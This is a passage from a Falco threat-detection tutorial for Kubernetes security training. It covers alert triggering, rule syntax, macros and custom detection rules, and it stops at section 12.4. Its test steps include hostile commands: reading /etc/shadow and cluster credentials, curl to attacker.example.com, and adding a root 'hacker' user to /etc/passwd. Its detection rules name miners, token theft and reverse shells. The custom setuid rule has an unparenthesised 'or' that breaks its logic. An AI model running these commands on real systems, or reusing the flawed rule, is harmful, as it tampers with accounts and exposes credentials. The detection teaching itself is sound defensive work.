# Use Falco to Detect Threats

> **Module:** Monitoring, Logging and Runtime Security
> **Chapter:** 3 of 6
> **Scope:** End-to-end threat detection workflow, Falco rule anatomy, lists, macros, condition language, output fields, live log monitoring, and writing production-grade custom rules.

---

## Table of Contents

1. [Detection Workflow Overview](#1-detection-workflow-overview)
2. [Verifying Falco Is Running](#2-verifying-falco-is-running)
3. [Generating Events — Deploying a Test Pod](#3-generating-events--deploying-a-test-pod)
4. [Monitoring Falco Logs in Real Time](#4-monitoring-falco-logs-in-real-time)
5. [Triggering Alerts — Shell and Sensitive File Access](#5-triggering-alerts--shell-and-sensitive-file-access)
6. [Falco Rule Anatomy — The Five Mandatory Keys](#6-falco-rule-anatomy--the-five-mandatory-keys)
7. [Lists — Reusable Item Collections](#7-lists--reusable-item-collections)
8. [Macros — Reusable Condition Fragments](#8-macros--reusable-condition-fragments)
9. [The Falco Condition Language](#9-the-falco-condition-language)
10. [Output Fields and Formatting](#10-output-fields-and-formatting)
11. [Writing Production-Grade Custom Rules](#11-writing-production-grade-custom-rules)
12. [As a DevSecOps / K8s Security Engineer](#12-as-a-devsecops--k8s-security-engineer)
13. [Real Present-Day Scenarios](#13-real-present-day-scenarios)
14. [What Happens If You Don't Follow This](#14-what-happens-if-you-dont-follow-this)
15. [Most Common Commands and Syntax](#15-most-common-commands-and-syntax)
16. [Other Tools and Services Available](#16-other-tools-and-services-available)
17. [How AI Is Impacting This Area](#17-how-ai-is-impacting-this-area)
18. [CKS Exam Tips](#18-cks-exam-tips)
19. [Links and References](#19-links-and-references)

---

## 1. Detection Workflow Overview

Using Falco to detect threats is a continuous loop that starts with deployment and ends with responding to alerts. Understanding the full lifecycle prevents gaps where attacks go undetected.

```
┌─────────────────────────────────────────────────────────────────┐
│                    FALCO DETECTION LIFECYCLE                    │
│                                                                 │
│  1. VERIFY        Confirm Falco service is active on all nodes  │
│       ↓                                                         │
│  2. DEPLOY        Create workloads — they generate syscall events│
│       ↓                                                         │
│  3. MONITOR       Tail Falco logs for real-time alert stream    │
│       ↓                                                         │
│  4. INTERACT      Perform actions that trigger built-in rules   │
│       ↓                                                         │
│  5. ANALYZE       Understand which rule fired and why           │
│       ↓                                                         │
│  6. CUSTOMIZE     Write / tune rules to match your threat model │
│       ↓                                                         │
│  7. VALIDATE      Test custom rules before production deploy    │
│       ↓                                                         │
│  8. RESPOND       Act on alerts — isolate, forensicate, remediate│
└─────────────────────────────────────────────────────────────────┘
```

The KodeKloud lesson walks steps 1–6 using an NGINX pod as the test workload. This chapter expands all eight steps with production depth.

### Why "Detect" Is an Active Skill

Falco ships with a comprehensive default ruleset covering dozens of threat patterns. However, default rules are intentionally conservative — they catch obvious, high-confidence threats. Every environment has workloads that do things the default rules consider suspicious but which are legitimate for that application. The skill of using Falco effectively is knowing:

- Which built-in rules are active and what they detect
- How to read and interpret alert output
- How to write custom rules for your specific threat model
- How to suppress false positives without creating detection blind spots

---

## 2. Verifying Falco Is Running

Before generating any test events, confirm Falco is actively monitoring the node. A Falco process that is not running simply will not produce alerts — there is no error, no warning, just silence. Silent failure is the worst kind in security tooling.

### 2.1 Systemd Service Check (Node-Installed Falco)

```bash
systemctl status falco
```

Full expected output:
```
● falco.service - Falco: Container Native Runtime Security
     Loaded: loaded (/lib/systemd/system/falco.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2024-05-16 10:22:31 UTC; 1h 23m ago
   Main PID: 12345 (falco)
      Tasks: 8 (limit: 4915)
     Memory: 42.1M
        CPU: 1.234s
     CGroup: /system.slice/falco.service
             └─12345 /usr/bin/falco --pidfile=/var/run/falco.pid

May 16 10:22:31 node01 falco[12345]: Falco version: 0.37.1 (x86_64)
May 16 10:22:31 node01 falco[12345]: Falco initialized with configuration file: /etc/falco/falco.yaml
May 16 10:22:31 node01 falco[12345]: Loading rules from file /etc/falco/falco_rules.yaml
May 16 10:22:31 node01 falco[12345]: Loading rules from file /etc/falco/falco_rules.local.yaml
May 16 10:22:31 node01 falco[12345]: Starting internal webserver, listening on port 8765
```

Key things to verify in the output:
- `Active: active (running)` — service is alive
- `Falco initialized with configuration file` — config loaded successfully
- `Loading rules from file` — rules are being read (count the files loaded)
- No `ERROR` or `WARN` lines in the recent log section

### 2.2 What Active Does NOT Guarantee

`systemctl status falco` showing `active (running)` does NOT guarantee the kernel probe is functional. It only means the Falco user-space process is running. Always additionally verify the probe:

```bash
# For kernel module: verify it's loaded in the kernel
lsmod | grep falco_probe
# Expected: falco_probe    xxx   0

# For eBPF: verify BPF programs are attached
bpftool prog list | grep falco

# The definitive test: trigger a known alert and check if it fires
cat /etc/shadow
journalctl -u falco -n 5
```

If `cat /etc/shadow` does NOT produce a Falco alert, the probe is not working even though the service appears healthy.

### 2.3 DaemonSet Check (Helm-Deployed Falco)

```bash
# All Falco pods must be Running, 1/1 READY
kubectl get pods -n falco -o wide

# NAME          READY   STATUS    RESTARTS   AGE    NODE
# falco-7grdt   1/1     Running   0          2m     node01
# falco-tmq28   1/1     Running   0          2m     node02

# Check DaemonSet coverage: DESIRED == CURRENT == READY == AVAILABLE
kubectl get daemonset -n falco

# NAME    DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE
# falco   2         2         2       2            2

# Live pod logs
kubectl logs -n falco <falco-pod-name> -f
```

### 2.4 Multi-Node Cluster: Check All Nodes

```bash
# List all nodes and confirm Falco has a pod on each
kubectl get pods -n falco -o wide --no-headers | awk '{print $7}' | sort
# Compare with:
kubectl get nodes --no-headers | awk '{print $1}' | sort

# If a node is missing a Falco pod, investigate:
kubectl describe node <missing-node>    # Look for taints blocking the DaemonSet
kubectl get events -n falco             # Look for scheduling failures
```

---

## 3. Generating Events — Deploying a Test Pod

To see Falco in action, you need workloads running on the cluster. Any running container will generate events, but an NGINX pod is the canonical test workload because it's lightweight and easy to `exec` into.

### 3.1 Deploy the Test Pod

```bash
# Deploy NGINX pod in default namespace
kubectl run nginx --image=nginx

# Verify it is scheduled and running
kubectl get pods -o wide
```

Expected output:
```
NAME    READY   STATUS    RESTARTS   AGE   IP            NODE     NOMINATED NODE
nginx   1/1     Running   0          30s   10.244.1.15   node01   <none>
```

Note the **NODE** column — this tells you which node the pod landed on. You will need to SSH into this specific node to watch Falco's log output (if using node-installed Falco).

### 3.2 Why Node Placement Matters

When Falco is installed as a node service (`systemctl`), each Falco instance only monitors that node's syscalls. If your test pod runs on `node01` but you're reading Falco logs on `node02`, you will see nothing. This is a common exam trap.

```
Control Plane (SSH session 1: kubectl)
    │
    │  kubectl exec -ti nginx -- bash
    │
    ▼
node01 (SSH session 2: journalctl -fu falco)
    │
    ├── nginx pod running here ← events generated HERE
    └── falco service running here ← alerts appear HERE
```

### 3.3 Ensure SSH Access to the Correct Node

```bash
# Find which node the pod is on
kubectl get pod nginx -o jsonpath='{.spec.nodeName}'
# Output: node01

# SSH into that node
ssh node01

# Or from within the cluster (for exam environments):
ssh node01
```

---

## 4. Monitoring Falco Logs in Real Time

Once you know which node the pod is on, open a second terminal session and begin tailing Falco's log output on that node. This is the "monitoring console" — you will watch alerts appear here as you interact with the pod.

### 4.1 The Primary Log Command

```bash
# -f = follow (tail in real time)
# -u = unit (specify the systemd service)
journalctl -fu falco
```

The `journalctl -fu falco` command is the single most important Falco monitoring command. Breaking it down:
- `journalctl` — systemd's unified log reader
- `-f` — follow mode (like `tail -f`), streams new entries as they appear
- `-u falco` — filter to only the `falco` systemd unit

### 4.2 Alternative Log Commands

```bash
# Show last 50 lines then follow
journalctl -fu falco -n 50

# Show logs from the last 10 minutes
journalctl -u falco --since "10 minutes ago"

# Show only WARNING or higher (filter with grep)
journalctl -fu falco | grep -E "Warning|Error|Critical|Emergency"

# Show logs in JSON format (if Falco is configured for JSON output)
journalctl -fu falco | jq '.'

# For DaemonSet: tail logs from the pod on the relevant node
kubectl logs -n falco <falco-pod-on-node01> -f

# Tail all Falco pods simultaneously (requires kubetail or stern)
stern -n falco falco
```

### 4.3 Reading the Log Format

A raw Falco alert in the default text format looks like:

```
May 16 12:34:56.789012 Warning Sensitive file opened for reading by non-trusted program
(user=root user_loginuid=0 program=cat command=cat /etc/shadow file=/etc/shadow
parent=bash gparent=sshd ggparent=systemd container_id=abc123def456
image=docker.io/library/nginx:latest)
```

Breaking this down:

| Part | Content | Meaning |
|---|---|---|
| `May 16 12:34:56.789012` | Timestamp | When the event occurred (nanosecond precision) |
| `Warning` | Priority | Severity level from the rule definition |
| `Sensitive file opened...` | Rule output | The rule's `output` field (first part) |
| `user=root` | Output field | User who performed the action |
| `program=cat` | Output field | Binary that opened the file |
| `command=cat /etc/shadow` | Output field | Full command line |
| `file=/etc/shadow` | Output field | The specific file accessed |
| `container_id=abc123def456` | Output field | Docker container ID |
| `image=docker.io/library/nginx:latest` | Output field | Container image |

### 4.4 JSON Format (Recommended for Production)

Configure `json_output: true` in `/etc/falco/falco.yaml` and alerts become structured:

```json
{
  "output": "Sensitive file opened for reading by non-trusted program ...",
  "priority": "Warning",
  "rule": "Read sensitive file untrusted",
  "source": "syscall",
  "tags": ["filesystem", "mitre_credential_access", "T1003"],
  "time": "2024-05-16T12:34:56.789012345Z",
  "output_fields": {
    "container.id": "abc123def456",
    "container.image.repository": "docker.io/library/nginx",
    "container.image.tag": "latest",
    "evt.time": 1715862896789012345,
    "fd.name": "/etc/shadow",
    "k8s.ns.name": "default",
    "k8s.pod.name": "nginx",
    "proc.cmdline": "cat /etc/shadow",
    "proc.name": "cat",
    "proc.pname": "bash",
    "user.loginuid": 0,
    "user.name": "root"
  }
}
```

JSON format is essential for SIEM ingestion, automated parsing, and Falcosidekick routing.

---

## 5. Triggering Alerts — Shell and Sensitive File Access

### 5.1 Triggering Alert 1: Shell Inside a Container

The default Falco ruleset includes a rule that fires when an interactive shell is opened inside a container. This is a standard Falco detection — it maps to MITRE ATT&CK T1059 (Command and Scripting Interpreter) in the container context.

```bash
# From the control plane terminal:
kubectl exec -ti nginx -- bash
```

**What happens at the syscall level:**
1. `kubectl exec` calls the Kubernetes API
2. The API calls the kubelet on node01
3. The kubelet calls the container runtime (`containerd`)
4. The container runtime executes `bash` inside the NGINX container namespace
5. This triggers an `execve` syscall inside the container
6. Falco's probe captures this `execve` with `proc.name=bash` and `container.id != host`
7. The built-in rule matches and fires an alert

**Expected alert in Falco logs:**
```
Warning A shell was spawned in a container with an attached terminal
(user=root user_loginuid=-1 k8s.ns=default k8s.pod=nginx container=abc123
shell=bash parent=runc cmdline=bash terminal=34816 container_id=abc123def456
image=nginx)
```

### 5.2 Triggering Alert 2: Sensitive File Read (`/etc/shadow`)

Inside the NGINX container shell you just opened:

```bash
# Run this INSIDE the nginx container:
cat /etc/shadow
```

**What happens at the syscall level:**
1. `cat /etc/shadow` triggers an `open` syscall with the path `/etc/shadow`
2. `/etc/shadow` is in Falco's list of `sensitive_files`
3. `cat` is not in the list of trusted programs that legitimately read this file
4. The built-in rule `Read sensitive file untrusted` matches
5. Alert fires immediately

**Expected alert in Falco logs:**
```
Warning Sensitive file opened for reading by non-trusted program
(user=root user_loginuid=-1 program=cat command=cat /etc/shadow file=/etc/shadow
parent=bash gparent=kubectl-exec ggparent=kubelet container_id=abc123def456
image=docker.io/library/nginx:latest k8s.pod=nginx k8s.ns=default)
```

### 5.3 Other Easy-to-Trigger Built-in Rules

Inside the container, try these to see more alert types:

```bash
# Write to /bin directory (suspicious in containers)
touch /bin/testfile
# Rule: "Write below binary dir"

# Run a network tool
which curl && curl http://attacker.example.com
# Rule: "Unexpected outbound connection to known malicious IP" (if IP is in list)

# Read docker socket (if mounted)
ls /var/run/docker.sock
# Rule: "Docker or K8s credentials access"

# Attempt to read /etc/kubernetes/admin.conf
cat /etc/kubernetes/admin.conf 2>/dev/null
# Rule: "Kubernetes credentials accessed from a container"

# Modify /etc/passwd
echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd
# Rule: "Modify system files"
```

---

## 6. Falco Rule Anatomy — The Five Mandatory Keys

Every Falco rule is a YAML document with exactly five required keys. Understanding each key is the foundation of writing, modifying, and debugging rules.

### 6.1 Complete Rule Example (From KodeKloud)

```yaml
- rule: Detect Shell inside a container
  desc: Alert if a shell such as bash is open inside a container
  condition: container and proc.name in (linux_shells)
  output: Bash Opened (user=%user.name container=%container.id)
  priority: WARNING
```

### 6.2 Key 1: `rule`

The **unique name** for this rule. It is used as an identifier when:
- Overriding a rule in `falco_rules.local.yaml`
- Filtering alerts by rule name
- Referencing the rule in dashboards and SIEM queries

```yaml
rule: Detect Shell inside a container
```

Rules names should be descriptive, unique, and action-oriented (what is detected, not what happened). Naming conventions in the default Falco ruleset follow `<Verb> <Object> [qualifier]` pattern:
- `Read sensitive file untrusted`
- `Write below binary dir`
- `Terminal shell in container`
- `Redirect STDOUT/STDIN to Network Connection in Container`

### 6.3 Key 2: `desc`

A **human-readable explanation** of what the rule detects and why it is suspicious. This is crucial for:
- New team members understanding the ruleset
- Post-incident analysis to understand what triggered an alert
- Documentation and compliance reporting

```yaml
desc: Alert if a shell such as bash is open inside a container
```

Good `desc` fields explain the threat model: what behaviour is detected, why it is suspicious, and what attack it might indicate.

### 6.4 Key 3: `condition`

The **filtering expression** that determines when the rule fires. This is evaluated against every syscall event. The condition language uses:
- **Field names** (`proc.name`, `container.id`, `fd.name`)
- **Boolean operators** (`and`, `or`, `not`)
- **Comparison operators** (`=`, `!=`, `<`, `>`, `in`, `contains`, `startswith`, `endswith`)
- **Macros** (named condition fragments defined separately)
- **Lists** (named collections of items)

```yaml
condition: container and proc.name in (linux_shells)
```

Breaking this down:
- `container` — a macro that expands to `container.id != host` (the event comes from inside a container, not the host)
- `and` — both conditions must be true
- `proc.name in (linux_shells)` — the process name is in the `linux_shells` list

The condition is the heart of the rule — too broad and you get false positives, too narrow and you miss real threats.

### 6.5 Key 4: `output`

The **message template** that appears in the alert. It uses `%field.name` syntax to embed dynamic values from the event.

```yaml
output: Bash Opened (user=%user.name container=%container.id)
```

This produces alerts like:
```
Bash Opened (user=root container=abc123def456)
```

Output fields should include enough context for the responder to immediately identify:
1. **Who** — `%user.name`, `%user.uid`
2. **What** — `%proc.name`, `%proc.cmdline`, `%fd.name`
3. **Where** — `%container.name`, `%k8s.pod.name`, `%k8s.ns.name`
4. **How** — `%proc.pname` (parent process), `%proc.cmdline`

### 6.6 Key 5: `priority`

The **severity level** of the alert. Falco evaluates rules at all priority levels but the `priority` setting in `falco.yaml` determines the minimum level that generates output. Priorities from highest to lowest:

| Priority | Numeric | Typical Use |
|---|---|---|
| `EMERGENCY` | 0 | System is unusable — rarely used |
| `ALERT` | 1 | Must act immediately (active attack underway) |
| `CRITICAL` | 2 | Critical condition (container escape, privilege escalation) |
| `ERROR` | 3 | Error condition (system file modification, creds access) |
| `WARNING` | 4 | Most Falco rules — suspicious but not confirmed malicious |
| `NOTICE` | 5 | Notable but not necessarily malicious |
| `INFORMATIONAL` | 6 | Informational — useful for auditing |
| `DEBUG` | 7 | High-volume, low-signal events |

```yaml
priority: WARNING
```

**Priority vs. Response:** Priority should reflect confidence, not just severity. A cryptominer execution is `CRITICAL` (high confidence malicious). A shell in a container is `WARNING` (suspicious, but could be a developer debugging).

---

## 7. Lists — Reusable Item Collections

Lists are named arrays of values that can be referenced in rule conditions. They exist purely to make conditions more readable and maintainable.

### 7.1 List Definition and Use

```yaml
# Definition
- list: linux_shells
  items: [bash, zsh, ksh, sh, csh]

# Usage in condition
condition: proc.name in (linux_shells)
```

Without the list, the condition would be:
```yaml
condition: proc.name in (bash, zsh, ksh, sh, csh)
```

Both are functionally identical. The list version is better because:
- Adding a new shell (e.g., `fish`, `dash`) requires changing only the list definition
- The condition `proc.name in (linux_shells)` is self-documenting
- The same list can be reused across multiple rules

### 7.2 More Built-in List Examples

From Falco's default rules:

```yaml
# Sensitive file paths that should not be read by arbitrary processes
- list: sensitive_files
  items:
    - /etc/shadow
    - /etc/sudoers
    - /etc/pam.conf
    - /etc/security/pwquality.conf
    - /run/secrets

# Processes that legitimately read sensitive files
- list: sensitive_file_readers
  items:
    - shadowutils
    - chage
    - passwd
    - usermod
    - adduser
    - newusers

# Directories that should not be written to in containers
- list: system_directories
  items:
    - /usr
    - /bin
    - /sbin
    - /lib
    - /lib64
    - /boot
    - /etc

# Known container management tools
- list: container_mgmt_binaries
  items:
    - docker
    - rkt
    - kubectl
    - crictl
    - ctr
    - nerdctl
```

### 7.3 Custom List Example

```yaml
# Define a list of approved container registries
- list: approved_registries
  items:
    - "company.registry.io"
    - "gcr.io/company-project"
    - "quay.io/company"

# Use in a rule
- rule: Container from Unapproved Registry
  desc: A container is running from a registry not on the approved list
  condition: >
    container.image.repository not in (approved_registries)
  output: Unapproved registry (image=%container.image.repository pod=%k8s.pod.name)
  priority: WARNING
```

### 7.4 Appending to Existing Lists (Local Override Pattern)

```yaml
# In falco_rules.local.yaml — extend the built-in list without editing falco_rules.yaml
- list: sensitive_file_readers
  items: [prometheus, node-exporter, my-audit-agent]
  override:
    items: append    # Add to the list, don't replace it
```

This is the correct way to customise built-in lists — never edit `falco_rules.yaml` directly (it gets overwritten on upgrade).

---

## 8. Macros — Reusable Condition Fragments

Macros are named condition fragments that can be referenced inside other conditions (or other macros). They are the key tool for making complex conditions readable and avoiding repetition.

### 8.1 Macro Definition and Use

```yaml
# Definition
- macro: container
  condition: container.id != host

# Usage in rule condition
condition: container and proc.name in (linux_shells)
```

When Falco evaluates the rule, it substitutes the macro inline:
```
container and proc.name in (linux_shells)
→ container.id != host and proc.name in (linux_shells)
```

### 8.2 The `container` Macro — Most Important Default Macro

The `container` macro is used in nearly every container-security rule:
```yaml
- macro: container
  condition: container.id != host
```

`container.id != host` is the way Falco distinguishes events that happened inside a container from events that happened on the host OS. `container.id` is set to the string `"host"` for events from the host namespace. For any containerised process, it is the container's short ID (e.g., `abc123def456`).

### 8.3 Compound Macros

Macros can reference other macros:

```yaml
- macro: interactive
  condition: >
    (proc.aname=sshd or proc.name=sshd) and
    proc.tty != 0

- macro: container
  condition: container.id != host

- macro: interactive_container_shell
  condition: container and interactive and proc.name in (linux_shells)
```

### 8.4 Built-in Macros from the Default Ruleset

```yaml
# Events from containers (not host)
- macro: container
  condition: container.id != host

# File open for reading
- macro: open_read
  condition: evt.type in (open,openat,openat2) and evt.is_open_read=true and fd.typechar='f'

# File open for writing  
- macro: open_write
  condition: evt.type in (open,openat,openat2) and evt.is_open_write=true and fd.typechar='f'

# Spawning a process
- macro: spawned_process
  condition: evt.type=execve and evt.dir=<

# Network connection
- macro: outbound
  condition: >
    evt.type in (sendmsg, sendto) and
    fd.typechar = 4 and
    fd.is_server = false

# Process is running with root privileges
- macro: proc_is_root
  condition: user.uid=0

# Running in a Kubernetes context
- macro: k8s_containers
  condition: k8s.ns.name exists
```

### 8.5 Overriding Macros in Local Rules

A powerful pattern: override a macro to add exceptions without changing the rule itself.

```yaml
# Default macro in falco_rules.yaml:
- macro: never_true
  condition: (evt.num=0)

# Default rule uses this macro:
- rule: Write below etc
  condition: open_write and etc_dir and not never_true
  ...

# In falco_rules.local.yaml — add an exception by appending to the macro:
- macro: never_true
  condition: proc.name in (my_config_manager, chef-client, puppet)
  override:
    condition: append
```

This appends the exception to `never_true`, making the rule ignore those processes without touching the rule definition itself.

---

## 9. The Falco Condition Language

Falco's condition language is a rich expression system for filtering syscall events. Mastery of this language is the difference between writing rules that work and rules that either miss attacks or flood you with false positives.

### 9.1 Event Type Filtering

```yaml
# Filter by syscall type
evt.type = execve             # Process execution
evt.type = open               # File open (older kernels)
evt.type = openat             # File open (newer kernels, most common)
evt.type in (open, openat, openat2)   # Cover all variants

# Filter by event direction
evt.dir = <                   # Syscall exit (result available)
evt.dir = >                   # Syscall entry
```

Always check exit events (`evt.dir = <`) for file/network operations — the return value tells you if the syscall succeeded.

### 9.2 Process Fields

```yaml
proc.name = bash              # Process binary name (basename)
proc.exe = /bin/bash          # Full executable path
proc.cmdline = "cat /etc/shadow"  # Full command line including args
proc.args = "/etc/shadow"     # Arguments only
proc.pid = 12345              # Process ID
proc.ppid = 456               # Parent process ID
proc.pname = sshd             # Parent process name
proc.aname = kubelet          # Ancestor process name (any level)
proc.exepath = /usr/bin/cat   # Resolved executable path (follows symlinks)
proc.tty != 0                 # Process has an attached terminal (interactive)
proc.is_exe_writable          # Executable is writable (suspicious)
```

### 9.3 File / File Descriptor Fields

```yaml
fd.name = /etc/shadow         # File descriptor path
fd.directory = /etc           # Parent directory of fd
fd.typechar = f               # Type: f=file, d=dir, 4=IPv4 sock, 6=IPv6 sock
fd.is_server = false          # Is this the server side of a socket?
fd.rip = 1.2.3.4             # Remote IP (for network fds)
fd.rport = 4444               # Remote port
fd.sport = 8080               # Source port
fd.sip                        # Source IP
```

### 9.4 User and Group Fields

```yaml
user.name = root              # Username
user.uid = 0                  # User ID (0 = root)
user.loginuid = 1000          # Login UID (the original user before su/sudo)
user.loginname = alice        # Login username
group.gid = 0                 # Group ID
```

### 9.5 Container Fields

```yaml
container.id = abc123def456   # Container ID
container.id != host          # Is a container (not host)
container.name = nginx        # Container name
container.image.repository = nginx           # Image repo (without tag)
container.image.tag = 1.25                   # Image tag
container.image.digest = sha256:...          # Image digest
container.privileged = true   # Running in privileged mode
container.mounts contains /etc               # Has a specific mount
```

### 9.6 Kubernetes Fields

```yaml
k8s.pod.name = nginx          # Pod name
k8s.ns.name = default         # Namespace
k8s.pod.label.app = web       # Pod label
k8s.deployment.name = nginx   # Deployment name
k8s.rs.name = nginx-xyz       # ReplicaSet name
k8s.ns.name exists            # Event is from a k8s-managed container
```

### 9.7 Network Fields

```yaml
fd.rip = 8.8.8.8              # Remote IP
fd.rport = 53                 # Remote port
fd.l4proto = tcp              # Protocol
fd.rip.name = "malicious.io"  # Hostname resolution (if DNS lookup was captured)
```

### 9.8 Condition Operators

```yaml
# Equality
proc.name = bash
proc.name != sh

# Comparison
proc.uid >= 1000              # Non-root users

# Set membership
proc.name in (bash, sh, zsh)
proc.name not in (known_shells)

# String matching
container.image.repository contains "nginx"
fd.name startswith "/etc/"
fd.name endswith ".key"
container.image.repository glob "*/attacker/*"

# Regex
fd.name pmatch /etc/(shadow|passwd|sudoers)

# Existence
k8s.pod.name exists
container.image.digest exists

# Boolean
user.uid = 0 and container and fd.name = /etc/shadow
user.uid = 0 or proc.name = root
not proc.name in (trusted_processes)
```

---

## 10. Output Fields and Formatting

The `output` field defines what appears in the alert. Mastering output formatting makes alerts actionable and reduces investigation time.

### 10.1 Output Syntax

Output is a string with embedded field references using `%field.name` syntax:

```yaml
output: >
  Shell spawned in container
  (user=%user.name uid=%user.uid container=%container.name
   image=%container.image.repository cmd=%proc.cmdline
   parent=%proc.pname pod=%k8s.pod.name ns=%k8s.ns.name)
```

The `>` (YAML folded scalar) allows multi-line output that is joined into a single line.

### 10.2 Recommended Output Fields for Container Rules

A well-designed output message for container security should include:

```yaml
output: >
  <Rule description>
  (user=%user.name loginuid=%user.loginuid
   container_id=%container.id container_name=%container.name
   image=%container.image.repository:%container.image.tag
   pod=%k8s.pod.name namespace=%k8s.ns.name
   proc=%proc.name parent=%proc.pname
   cmdline=%proc.cmdline
   evt_time=%evt.time)
```

### 10.3 Conditional Output

You can use output fields even if they might be empty — Falco will print `<NA>` for undefined fields:

```yaml
output: "Alert (container=%container.name fd=%fd.name)"
# If fd.name is not set: "Alert (container=nginx fd=<NA>)"
```

### 10.4 Output with Tags (MITRE ATT&CK Mapping)

```yaml
- rule: Detect Shell inside a container
  desc: Alert if a shell is opened inside a container
  condition: container and proc.name in (linux_shells)
  output: Bash Opened (user=%user.name container=%container.id)
  priority: WARNING
  tags:
    - container
    - shell
    - mitre_execution
    - T1059              # MITRE ATT&CK technique ID
    - NIST_800-53_AC-4   # Compliance mapping
```

Tags appear in JSON output and can be used by SIEM systems for automatic compliance mapping.

---

## 11. Writing Production-Grade Custom Rules

### 11.1 The Basic Custom Rule Workflow

```
1. Identify the threat behaviour (what syscall pattern indicates malice?)
2. Draft the condition using relevant fields
3. Test against known-good events (tune out false positives)
4. Add to falco_rules.local.yaml (never edit falco_rules.yaml)
5. Reload Falco and validate
6. Monitor alert volume for 24–48 hours
7. Iterate
```

### 11.2 Example Set: Custom Rules for a Production Cluster

**Rule 1: Detect Cryptocurrency Miner Execution**
```yaml
- list: crypto_miner_binaries
  items: [xmrig, minerd, cgminer, bfgminer, cpuminer, ethminer]

- rule: Cryptocurrency Miner Detected
  desc: Known cryptocurrency miner binary executed in a container
  condition: >
    container and
    proc.name in (crypto_miner_binaries)
  output: >
    Cryptocurrency miner executed
    (user=%user.name container=%container.name image=%container.image.repository
     proc=%proc.name cmdline=%proc.cmdline pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL
  tags: [cryptomining, mitre_impact, T1496]
```

**Rule 2: Detect kubectl Inside a Container**
```yaml
- rule: kubectl Executed Inside Container
  desc: kubectl was executed inside a running container — possible cluster API abuse
  condition: >
    container and
    proc.name = kubectl
  output: >
    kubectl executed in container
    (user=%user.name container=%container.name image=%container.image.repository
     cmdline=%proc.cmdline pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags: [container, kubernetes, mitre_lateral_movement, T1552]
```

**Rule 3: Detect Service Account Token Access**
```yaml
- macro: sa_token_path
  condition: >
    fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount/token or
    fd.name startswith /run/secrets/kubernetes.io/serviceaccount/token

- rule: Service Account Token Read by Unexpected Process
  desc: A process read the Kubernetes service account token unexpectedly
  condition: >
    container and
    open_read and
    sa_token_path and
    not proc.name in (known_k8s_clients)
  output: >
    Service account token accessed
    (user=%user.name proc=%proc.name cmdline=%proc.cmdline
     container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags: [kubernetes, credential_access, T1552.007]
```

**Rule 4: Detect Reverse Shell Pattern**
```yaml
- macro: network_connection_outside_k8s
  condition: >
    fd.typechar = 4 and
    fd.rip != 10.0.0.0/8 and
    fd.rip != 172.16.0.0/12 and
    fd.rip != 192.168.0.0/16 and
    fd.rip != 127.0.0.1

- rule: Outbound Connection from Shell Process
  desc: A shell process established an outbound network connection — potential reverse shell
  condition: >
    container and
    proc.name in (linux_shells) and
    outbound and
    network_connection_outside_k8s
  output: >
    Potential reverse shell
    (user=%user.name shell=%proc.name container=%container.name
     remote_ip=%fd.rip remote_port=%fd.rport
     pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL
  tags: [reverse_shell, mitre_command_and_control, T1059]
```

**Rule 5: Detect Privilege Escalation via setuid**
```yaml
- rule: Setuid or Setgid Bit Set via chmod
  desc: chmod was used to set SUID/SGID bit — privilege escalation technique
  condition: >
    container and
    evt.type = chmod and
    evt.arg.mode contains S_ISUID or
    evt.arg.mode contains S_ISGID
  output: >
    SUID/SGID bit set in container
    (user=%user.name proc=%proc.name file=%fd.name mode=%evt.arg.mode
     container=%container.name pod=%k8s.pod.name)
  priority: ERROR
  tags: [privilege_escalation, T1548.001]
```

### 11.3 Deploying Custom Rules

```bash
# Always add custom rules to the local file, not the built-in file
nano /etc/falco/falco_rules.local.yaml

# Validate before reloading
falco --validate /etc/falco/falco.yaml
falco -r /etc/falco/falco_rules.local.yaml --validate

# Reload Falco to pick up new rules (no restart needed in Falco 0.28+)
kill -1 $(cat /var/run/falco.pid)
# or:
systemctl reload falco
# or:
systemctl restart falco
```

For DaemonSet deployment, update the Helm values with a ConfigMap containing your custom rules:

```yaml
# In helm values or via kubectl
customRules:
  custom-rules.yaml: |
    - list: crypto_miner_binaries
      items: [xmrig, minerd]
    - rule: Cryptocurrency Miner Detected
      ...
```

### 11.4 Testing Rules with the Event Generator

```bash
# Install the Falco event generator
kubectl apply -f \
  https://raw.githubusercontent.com/falcosecurity/event-generator/main/deployment/kubernetes/event-generator.yaml

# Generate specific events to test rules
event-generator run syscall.ReadSensitiveFileUntrusted
event-generator run syscall.WriteBelowEtcDirectory
event-generator run syscall.SpawnShellInContainer
```

---

## 12. As a DevSecOps / K8s Security Engineer

### 12.1 The "What Fired and Why" Investigation Loop

Every time a Falco alert appears in production, your first action is to understand what triggered it:

```bash
# 1. Get the full alert details
kubectl logs -n falco <falco-pod> | grep "rule_name" | tail -5 | jq '.'

# 2. Identify the container
kubectl get pod <pod-name> -n <namespace> -o yaml

# 3. Check what the process was doing
kubectl exec -it <pod-name> -n <namespace> -- ps aux
kubectl exec -it <pod-name> -n <namespace> -- ss -tnp

# 4. Decide: false positive or real threat?
# False positive → add exception to falco_rules.local.yaml
# Real threat → escalate to incident response
```

### 12.2 False Positive Management Strategy

A sustainable Falco deployment requires systematic false positive management:

**Week 1:** Deploy in `WARNING` mode. Log everything. Don't page on anything yet.

**Week 2:** Analyze alert volume. Categorize:
- `EXPECTED` — legitimate application behaviour
- `SUSPICIOUS` — needs investigation
- `FALSE_POSITIVE` — confirmed legitimate, will suppress

**Week 3:** Add exceptions for `FALSE_POSITIVE` categories. Enable paging for `CRITICAL` alerts.

**Month 2+:** Iteratively add exceptions, promote more alerts to paging, tune rule priorities.

### 12.3 Writing Rules as Code (GitOps)

Treat Falco rules as infrastructure code:

```
falco-rules/
├── README.md
├── rules/
│   ├── custom-shell-detection.yaml
│   ├── crypto-miners.yaml
│   ├── credential-access.yaml
│   └── lateral-movement.yaml
├── lists/
│   ├── approved-registries.yaml
│   └── trusted-processes.yaml
└── macros/
    └── container-contexts.yaml
```

Store in Git, review with PRs, deploy via Helm ConfigMap. Every rule change is auditable.

### 12.4 Metrics and SLOs for Falco

Track these metrics to measure your detection programme's health:

| Metric | Formula | Target |
|---|---|---|
| Alert Volume | Alerts per hour | < 50 (after tuning) |
| False Positive Rate | FP / Total alerts | < 10% |
